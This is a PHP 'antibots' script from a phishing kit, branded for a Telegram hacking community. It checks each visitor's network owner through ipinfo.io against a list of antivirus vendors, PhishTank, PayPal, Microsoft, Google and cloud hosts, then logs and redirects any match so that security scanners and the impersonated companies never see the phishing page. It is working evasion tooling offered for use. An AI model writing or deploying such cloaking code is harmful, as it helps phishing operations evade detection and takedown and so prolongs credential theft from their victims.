<?php
/*
       t . m e / b i g s e c c o m m u n i t y 

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
 ███   ███   ███   ███    ███   ███    ███   ███    █▀  
 ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
 ███   ███   ███   ███    ███ ▀███████████          ███ 
 ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
                                ███    ███              

 M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
 */
$user_ip = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$shit_isps=array("DigitalOcean","Amazon","Google","phishtank","net4sec","AVAST Software s.r.o.","BullGuard ApS","PayPal","Hotmail","Yahoo","AOL","Microsoft","Kaspersky Lab","Linode, LLC","MSN","ONLINE S.A.S.","Joshua Peter McQuistan","OVH SAS","avira","Forcepoint","Cloud","Forcepoint Cloud Ltd","Google LLC","Facebook, Inc.");


$ipp=isset($user_ip)&&$user_ip!=""?$user_ip:"1.1.1.1";$ISP=@file_get_contents('http://ipinfo.io/'.$ipp.'/org');if($ISP==false){return "ppp";}

foreach($shit_isps as $isp){
	if(substr_count($ISP,$isp) > 0 or $dp == "" or $dp == " " or $dp == "	"){
		$content = "AntiBots => ".$ipp." [ Bad ] \n";
		$save=fopen("bots.txt","a+");
		fwrite($save,$content);fclose($save);
		header('Location: '.$redirectLink);exit();

	}
}

?>